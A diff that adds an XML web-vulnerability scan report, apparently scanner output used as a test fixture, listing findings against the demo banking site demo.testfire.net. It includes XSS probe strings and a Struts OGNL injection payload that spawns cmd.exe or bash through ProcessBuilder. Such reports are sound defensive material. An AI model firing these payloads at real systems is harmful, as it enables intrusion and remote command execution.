@@ -1,0 +1,3199 @@
+<?xml version='1.0' encoding='UTF-8'?>
+<WAS_SCAN_REPORT>
+    <HEADER>
+        <NAME>Scan Report</NAME>
+        <DESCRIPTION>Vulnerabilities of all selected scans are consolidated into one report so that you can view their evolution.</DESCRIPTION>
+        <GENERATION_DATETIME>10 Nov 2017 12:58PM GMT-0500</GENERATION_DATETIME>
+
+    </HEADER>
+    <FILTERS>
+        <FILTER>
+            <NAME>REMEDIATION</NAME>
+            <VALUE>Include patched findings</VALUE>
+        </FILTER>
+        <FILTER>
+            <NAME>REMEDIATION</NAME>
+            <VALUE>Show ignored findings </VALUE>
+        </FILTER>
+    </FILTERS>
+    <TARGET>
+        <SCAN>Demo Vul Scan</SCAN>
+    </TARGET>
+    <SUMMARY>
+        <GLOBAL_SUMMARY>
+            <SECURITY_RISK>High</SECURITY_RISK>
+            <VULNERABILITY>42</VULNERABILITY>
+            <SENSITIVE_CONTENT>0</SENSITIVE_CONTENT>
+            <INFORMATION_GATHERED>19</INFORMATION_GATHERED>
+        </GLOBAL_SUMMARY>
+        <SUMMARY_STATS>
+            <SUMMARY_STAT>
+                <SCAN>Demo Vul Scan</SCAN>
+                <DATE>21 Sep 2017</DATE>
+                <LEVEL5>9</LEVEL5>
+                <LEVEL4>3</LEVEL4>
+                <LEVEL3>4</LEVEL3>
+                <LEVEL2>10</LEVEL2>
+                <LEVEL1>16</LEVEL1>
+                <SENSITIVE_CONTENT>0</SENSITIVE_CONTENT>
+                <INFORMATION_GATHERED>19</INFORMATION_GATHERED>
+            </SUMMARY_STAT>
+        </SUMMARY_STATS>
+    </SUMMARY>
+    <RESULTS>
+        <VULNERABILITY_LIST>
+            <VULNERABILITY>
+                <ID>245034766</ID>
+                <DETECTION_ID>4293585</DETECTION_ID>
+                <QID>150159</QID>
+                <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>N/A</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                            <HEADERS/>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[QVNQLk5FVF9TZXNzaW9uSWQ9dHNrb21wNDVpdmk1NXI0NTMwdHA1ZzJhOyBwYXRoPS87IGRvbWFp
+bj1kZW1vLnRlc3RmaXJlLm5ldDsgaHR0cG9ubHk=
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034746</ID>
+                <DETECTION_ID>4293565</DETECTION_ID>
+                <QID>150084</QID>
+                <URL>http://demo.testfire.net/comment.aspx</URL>
+                <PARAM>name</PARAM>
+                <FORM_ENTRY_POINT>http://demo.testfire.net/feedback.aspx</FORM_ENTRY_POINT>
+                <ACCESS_PATH>
+                    <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                    <URL>http://demo.testfire.net/feedback.aspx</URL>
+                </ACCESS_PATH>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD><![CDATA[cfile=comments.txt&name=%22'%3E%3C%3CSCRIPT%20a%3D2%3Eqss%3D7%3B%2F%2F%3C%3C%2FSCRIPT%3E&email_addr=123 Main St.&subject=1&comments=1&reset=%20Clear%20Form%20&submit=%20Submit%20]]></PAYLOAD>
+                        <REQUEST>
+                            <METHOD>POST</METHOD>
+                            <URL>http://demo.testfire.net/comment.aspx</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ lang=; amSessionId=132271899100; ASP.NET_SessionId=tskomp45ivi55r4530tp5g2a;]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[Y29tbWVudDogQSBzaWduaWZpY2FudCBwb3J0aW9uIG9mIHRoZSBYU1MgdGVzdCBwYXlsb2FkIGFw
+cGVhcmVkIGluIHRoZSB3ZWIgcGFnZSwgYnV0IHRoZSBwYWdlJ3MgRE9NIHdhcyBub3QgbW9kaWZp
+ZWQgYXMgZXhwZWN0ZWQgZm9yIGEgc3VjY2Vzc2Z1bCBleHBsb2l0LiBUaGlzIHJlc3VsdCBzaG91
+bGQgYmUgbWFudWFsbHkgdmVyaWZpZWQgdG8gZGV0ZXJtaW5lIGl0cyBhY2N1cmFjeS4KClJlc3Bv
+bnNlIGNvbnRlbnQtdHlwZTogdGV4dC9odG1sCgplZmF1bHQuYXNweD9jb250ZW50PWluc2lkZV9j
+YXJlZXJzLmh0bSI+Q2FyZWVyczwvYT48L2xpPg0KICAgICAgICA8L3VsPg0KICAgIDwvdGQ+DQog
+ICAgPHRkIHZhbGlnbj0idG9wIiBjb2xzcGFuPSIzIiBjbGFzcz0iYmIiPg0KDQoNCjxkaXYgY2xh
+c3M9ImZsIiBzdHlsZT0id2lkdGg6IDk5JTsiPg0KDQogPGgxPlRoYW5rIFlvdTwvaDE+DQogDQog
+PHA+VGhhbmsgeW91IGZvciB5b3VyIGNvbW1lbnRzLCAiJz48PFNDUklQVCBhPTI+cXNzPTc7Ly88
+PC9TQ1JJUFQ+LiAgVGhleSB3aWxsIGJlIHJldmlld2VkIGJ5IG91ciBDdXN0b21lciBTZXJ2aWNl
+IHN0YWZmIGFuZA0KIGdpdmVuIHRoZSBmdWxsIGF0dGVudGlvbiB0aGF0IHRoZXkgZGVzZXJ2ZS48
+L3A+DQoNCjwvZGl2Pg0KDQoNCiAgICA8L3RkPg0KICA8L3RyPg0KPC90YWJsZT4NCg0KDQo8L2Rp
+dj4NCg0KPGRpdiBpZD0iZm9vdGVyIiBzdHlsZT0id2lkdGg6IDk5JTsiPg0KICAgIDxhIGlkPSJf
+Y3RsMF9fY3RsMF9IeXBlcg==
+]]></CONTENTS>
+                            <EVIDENCE base64="true"><![CDATA[PDxTQ1JJUFQgYT0yPnFzcz03Oy8vPDwvU0NSSVBUPg==
+]]></EVIDENCE>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034754</ID>
+                <DETECTION_ID>4293573</DETECTION_ID>
+                <QID>150059</QID>
+                <URL>http://demo.testfire.net/bank/customize.aspx</URL>
+                <ACCESS_PATH>
+                    <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                </ACCESS_PATH>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD></PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/bank/customize.aspx</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ amSessionId=132271899100; ASP.NET_SessionId=tskomp45ivi55r4530tp5g2a;]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[YzpcZG93bmxvYWRzXEFsdG9yb011dHVhbF92Nlx3ZWJzaXRlXGJhbmtcYmFuay5tYXN0ZXIuY3M=
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034757</ID>
+                <DETECTION_ID>4293576</DETECTION_ID>
+                <QID>150003</QID>
+                <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                <PARAM>passw</PARAM>
+                <FORM_ENTRY_POINT>http://demo.testfire.net/bank/login.aspx</FORM_ENTRY_POINT>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD><![CDATA[uid=John&passw=%2525%7B%28%23_%3D%27multipart%2fform-data%27%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23str1%3D%27A2B8C3%27%29.%28%23str2%3D%27q9d4hi5j%27%29.%28%23str3%3D%27R9D7e8%27%29.%28%23str%3D%23str2%2b%27%3AQQ%3A%27%2b%23str1%2b%27%3ATT%3A%27%2b%23str3%29.%28%23cmd%3D%27echo%20%27%2b%20%23str%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&btnSubmit=Login]]></PAYLOAD>
+                        <REQUEST>
+                            <METHOD>POST</METHOD>
+                            <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ lang=; amSessionId=132271899100; ASP.NET_SessionId=tskomp45ivi55r4530tp5g2a;]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[bWJlckFjY2Vzcz8oI19tZW1iZXJBY2Nlc3M9I2RtKTooKCNjb250YWluZXI9I2NvbnRleHRbJ2Nv
+bS5vcGVuc3ltcGhvbnkueHdvcmsyLkFjdGlvbkNvbnRleHQuY29udGFpbmVyJ10pLigjb2dubFV0
+aWw9I2NvbnRhaW5lci5nZXRJbnN0YW5jZScuDTwvc3Bhbj48L2I+PC9wPg0KDQo8aDI+RXJyb3Ig
+TWVzc2FnZTo8L2gyPg0KDQo8cD48c3BhbiBpZD0iX2N0bDBfQ29udGVudF9sYmxEZXRhaWxzIj5T
+eXN0ZW0uRGF0YS5PbGVEYi5PbGVEYkV4Y2VwdGlvbjogU3ludGF4IGVycm9yIChtaXNzaW5nIG9w
+ZXJhdG9yKSBpbiBxdWVyeSBleHByZXNzaW9uICd1c2VybmFtZSA9ICdKb2huJyBBTkQgcGFzc3dv
+cmQgPSAnJTI1eygjXz0nbXVsdGlwYXJ0L2Zvcm0tZGF0YScpLigjZG09QG9nbmwuT2dubENvbnRl
+eHRAREVGQVVMVF9NRU1CRVJfQUNDRVNTKS4oI19tZW1iZXJBY2Nlc3M/KCNfbWVtYmVyQWNjZXNz
+PSNkbSk6KCgjY29udGFpbmVyPSNjb250ZXh0Wydjb20ub3BlbnN5bXBob24=
+]]></CONTENTS>
+                            <EVIDENCE base64="true"><![CDATA[U3lzdGVtLkRhdGEuT2xlRGIuT2xlRGJFeGNlcHRpb246IFN5bnRheCBlcnJvcg==
+]]></EVIDENCE>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034749</ID>
+                <DETECTION_ID>4293568</DETECTION_ID>
+                <QID>150059</QID>
+                <URL>http://demo.testfire.net/bank/queryxpath.aspx</URL>
+                <ACCESS_PATH>
+                    <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                </ACCESS_PATH>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD></PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/bank/queryxpath.aspx</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ lang=; amSessionId=132271899100; ASP.NET_SessionId=tskomp45ivi55r4530tp5g2a;]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[YzpcZG93bmxvYWRzXEFsdG9yb011dHVhbF92Nlx3ZWJzaXRlXGJhbmtcYmFuay5tYXN0ZXIuY3M=
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034767</ID>
+                <DETECTION_ID>4293586</DETECTION_ID>
+                <QID>150124</QID>
+                <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>N/A</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                            <HEADERS/>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[VGhlIFVSSSB3YXMgZnJhbWVkLgo=
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034747</ID>
+                <DETECTION_ID>4293566</DETECTION_ID>
+                <QID>150001</QID>
+                <URL>http://demo.testfire.net/comment.aspx</URL>
+                <PARAM>name</PARAM>
+                <FORM_ENTRY_POINT>http://demo.testfire.net/feedback.aspx</FORM_ENTRY_POINT>
+                <ACCESS_PATH>
+                    <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                    <URL>http://demo.testfire.net/feedback.aspx</URL>
+                </ACCESS_PATH>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD><![CDATA["'><qss%20a=@REQUESTID@>]]></PAYLOAD>
+                        <REQUEST>
+                            <METHOD>POST</METHOD>
+                            <URL>http://demo.testfire.net/comment.aspx</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ lang=; amSessionId=132271899100; ASP.NET_SessionId=tskomp45ivi55r4530tp5g2a;]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[Y29tbWVudDogClJlc3BvbnNlIGNvbnRlbnQtdHlwZTogdGV4dC9odG1sCgplZj0iZGVmYXVsdC5h
+c3B4P2NvbnRlbnQ9aW5zaWRlX2NhcmVlcnMuaHRtIj5DYXJlZXJzPC9hPjwvbGk+DQogICAgICAg
+IDwvdWw+DQogICAgPC90ZD4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGNvbHNwYW49IjMiIGNsYXNz
+PSJiYiI+DQoNCg0KPGRpdiBjbGFzcz0iZmwiIHN0eWxlPSJ3aWR0aDogOTklOyI+DQoNCiA8aDE+
+VGhhbmsgWW91PC9oMT4NCiANCiA8cD5UaGFuayB5b3UgZm9yIHlvdXIgY29tbWVudHMsICInPjxx
+c3MgYT1YMTYwMjg0Mzg0WTJaPi4gIFRoZXkgd2lsbCBiZSByZXZpZXdlZCBieSBvdXIgQ3VzdG9t
+ZXIgU2VydmljZSBzdGFmZiBhbmQNCiBnaXZlbiB0aGUgZnVsbCBhdHRlbnRpb24gdGhhdCB0aGV5
+IGRlc2VydmUuPC9wPg0KDQo8L2Rpdj4NCg0KDQogICAgPC90ZD4NCiAgPC90cj4NCjwvdGFibGU+
+DQoNCg0KPC9kaXY+DQoNCjxkaXYgaWQ9ImZvb3RlciIgc3R5bGU9IndpZHRoOiA5OSU7Ij4NCiAg
+ICA8YSBpZD0iX2N0bDBfX2N0bDBfSHlwZXJMaW5rNQ==
+]]></CONTENTS>
+                            <EVIDENCE base64="true"><![CDATA[PHFzcyBhPVgxNjAyODQzODRZMlo+
+]]></EVIDENCE>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034772</ID>
+                <DETECTION_ID>4293591</DETECTION_ID>
+                <QID>150013</QID>
+                <URL>http://demo.testfire.net/notfound.aspx?aspxerrorpath=/Privacypolicy.aspx</URL>
+                <PARAM>aspxerrorpath</PARAM>
+                <ACCESS_PATH>
+                    <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                    <URL>http://demo.testfire.net/default.aspx?content=inside_careers.htm</URL>
+                    <URL><![CDATA[http://demo.testfire.net/Privacypolicy.aspx?sec=Careers&template=US]]></URL>
+                </ACCESS_PATH>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>aspxerrorpath=%3Cscript%20src%3Dhttp%3A%2F%2Flocalhost%2Fj%20</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/notfound.aspx?aspxerrorpath=%3Cscript%20src%3Dhttp%3A%2F%2Flocalhost%2Fj%20</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ lang=; amSessionId=132271899100; ASP.NET_SessionId=tskomp45ivi55r4530tp5g2a;]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[Y29tbWVudDogClJlc3BvbnNlIGNvbnRlbnQtdHlwZTogdGV4dC9odG1sCgoNCiAgICA8L3RkPg0K
+ICAgIDx0ZCB2YWxpZ249InRvcCIgY29sc3Bhbj0iMyIgY2xhc3M9ImJiIj4NCg0KDQo8ZGl2IGNs
+YXNzPSJmbCIgc3R5bGU9IndpZHRoOiA5OSU7Ij4NCg0KPGgxPkFuIEVycm9yIEhhcyBPY2N1cnJl
+ZDwvaDE+DQoNCjxwPjxzcGFuIGlkPSJfY3RsMF9fY3RsMF9Db250ZW50X01haW5fZXJyb3IiPkNv
+dWxkIG5vdCBmaW5kIHRoZSBwYWdlIHlvdSByZXF1ZXN0ZWQuIDxicj48YnI+PGI+PHNjcmlwdCBz
+cmM9aHR0cDovL2xvY2FsaG9zdC9qIDwvYj48YnI+PGJyPlBsZWFzZSBjaGVjayB5b3VyIHNwZWxs
+aW5nLiBJZiB0aGUgc3BlbGxpbmcgaXMgY29ycmVjdCBhbmQgdGhlIHBhZ2Ugc3RpbGwgZG9lcyBu
+b3QgZXhpc3QgY29udGFjdCB0aGUgU3lzdGVtIEFkbWluaXN0cmF0b3IuPC9zcGFuPjwvcD4NCg0K
+PC9kaXY+DQoNCg0KICAgIDwvdGQ+DQogIDwvdHI+DQo8L3RhYmxlPg0KDQoNCjwvZGl2Pg0KDQo8
+ZGl2IGlkPSJmb290ZXIiIHN0eWxlPSJ3aWR0aDogOQ==
+]]></CONTENTS>
+                            <EVIDENCE base64="true"><![CDATA[PHNjcmlwdCBzcmM9aHR0cDovL2xvY2FsaG9zdC9qIDwvYj4=
+]]></EVIDENCE>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034753</ID>
+                <DETECTION_ID>4293572</DETECTION_ID>
+                <QID>150122</QID>
+                <URL>http://demo.testfire.net/bank/customize.aspx</URL>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>N/A</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/bank/customize.aspx</URL>
+                            <HEADERS/>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[bGFuZz07IHBhdGg9LzsgZG9tYWluPWRlbW8udGVzdGZpcmUubmV0
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034741</ID>
+                <DETECTION_ID>4293560</DETECTION_ID>
+                <QID>150081</QID>
+                <URL>http://demo.testfire.net/default.aspx?content=security.htm</URL>
+                <ACCESS_PATH>
+                    <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                </ACCESS_PATH>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>N/A</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/default.aspx?content=personal_checking.htm</URL>
+                            <HEADERS/>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[VGhlIHJlc3BvbnNlIGZvciB0aGlzIHJlcXVlc3QgZWl0aGVyIGRpZCBub3QgaGF2ZSBhbiAiWC1G
+UkFNRS1PUFRJT05TIiBoZWFkZXIgcHJlc2VudCBvciB3YXMgbm90IHNldCB0byBERU5ZIG9yIFNB
+TUVPUklHSU4K
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034779</ID>
+                <DETECTION_ID>4293598</DETECTION_ID>
+                <QID>150076</QID>
+                <URL>http://demo.testfire.net/disclaimer.htm?url=http://www.netscape.com</URL>
+                <ACCESS_PATH>
+                    <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                    <URL>http://demo.testfire.net/default.aspx?content=inside_contact.htm</URL>
+                </ACCESS_PATH>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD><![CDATA[<script>alert()</script>]]></PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/disclaimer.htm?url=http://www.microsoft.com</URL>
+                            <HEADERS/>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[Y29tbWVudDogVGFpbnQgcHJvcGFnYXRpb24gZGV0YWlsczoKClNvdXJjZTogCiAgIGRvY3VtZW50
+LlVSTApKUyBjYWxsIHN0YWNrOiAKICAgZnVuY3Rpb246IGRvY3VtZW50LndyaXRlIAogICAgZnVu
+Y3Rpb246IHVuZXNjYXBlIAogICAgZnVuY3Rpb246IHN1YnN0cmluZyAKIFNpbms6IAogICBkb2N1
+bWVudC53cml0ZQoKCkV4cGxvaXRhdGlvbiBiYWNrLXRyYWNlOgoKYWxlcnQKd3JpdGVAW25hdGl2
+ZSBjb2RlXQpjYWxsQFtuYXRpdmUgY29kZV0Kd3JpdGUKZ2xvYmFsIGNvZGVAaHR0cDovL2RlbW8u
+dGVzdGZpcmUubmV0L2Rpc2NsYWltZXIuaHRtP3VybD1odHRwOi8vd3d3Lm1pY3Jvc29mdC5jb20j
+JTNDc2NyaXB0JTNFYWxlcnQoMTAwMDApJTNDL3NjcmlwdCUzRTozNApOL0E=
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034745</ID>
+                <DETECTION_ID>4293564</DETECTION_ID>
+                <QID>150004</QID>
+                <URL>http://demo.testfire.net/test.aspx</URL>
+                <AJAX>false</AJAX>
